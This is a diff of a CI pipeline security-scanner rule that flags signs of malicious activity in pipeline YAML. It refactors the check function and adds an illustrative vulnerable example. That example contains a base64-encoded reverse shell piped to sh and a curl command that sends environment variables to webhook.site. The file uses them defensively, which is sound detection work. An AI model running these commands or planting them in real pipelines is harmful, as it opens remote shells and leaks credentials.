@@ -1,10 +1,9 @@
 """BB-025, pipeline contains evidence of malicious activity."""
 from __future__ import annotations
 
-from typing import Any
-
-from ..._malicious import find_malicious_patterns
-from ...base import Finding, Severity, blob_lower
+from ..._malicious import find_malicious_patterns, summarize_malicious_hits
+from ..._primitives.blob_rule import yaml_blob_check
+from ...base import Severity
 from ...rule import Rule
 
 RULE = Rule(
@@ -37,29 +36,36 @@ RULE = Rule(
         "MEDIUM`` to ignore all matches; the rule still surfaces the "
         "hit for teams that want to spot-check.",
     ),
+    exploit_example=(
+        "# Vulnerable: a step body executes a base64-decoded\n"
+        "# payload, exfils to a third-party webhook, or runs a\n"
+        "# known miner binary. A malicious PR (or a compromised\n"
+        "# maintainer) lands the payload in the pipeline file;\n"
+        "# every subsequent build executes it.\n"
+        "pipelines:\n"
+        "  default:\n"
+        "    - step:\n"
+        "        script:\n"
+        "          - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
+        "          - curl https://webhook.site/abc?env=$(env|base64)\n"
+        "\n"
+        "# Safe: the pipeline does only what the pipeline does.\n"
+        "# No obfuscated execution, no exfil POSTs, no\n"
+        "# base64 -d | sh pipelines. If a check fires it's a\n"
+        "# compromise or a CTF fixture; treat as incident response.\n"
+        "pipelines:\n"
+        "  default:\n"
+        "    - step:\n"
+        "        script:\n"
+        "          - make build"
+    ),
 )
 
 
-def check(path: str, doc: dict[str, Any]) -> Finding:
-    hits = find_malicious_patterns(blob_lower(doc))
-    if not hits:
-        return Finding(
-            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
-            resource=path,
-            description="No indicators of malicious activity detected.",
-            recommendation="No action required.", passed=True,
-        )
-    categories = sorted({c for c, _n, _e in hits})
-    summary = "; ".join(
-        f"{name} ({excerpt!r})" for _cat, name, excerpt in hits[:3]
-    )
-    desc = (
-        f"{len(hits)} indicator(s) of malicious activity "
-        f"({', '.join(categories)}). Examples: {summary}"
-        f"{'...' if len(hits) > 3 else ''}."
-    )
-    return Finding(
-        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
-        resource=path, description=desc,
-        recommendation=RULE.recommendation, passed=False,
-    )
+check = yaml_blob_check(
+    RULE,
+    scanner=find_malicious_patterns,
+    pass_desc="No indicators of malicious activity detected.",
+    fail_desc=summarize_malicious_hits,
+    pass_recommendation="No action required.",
+)
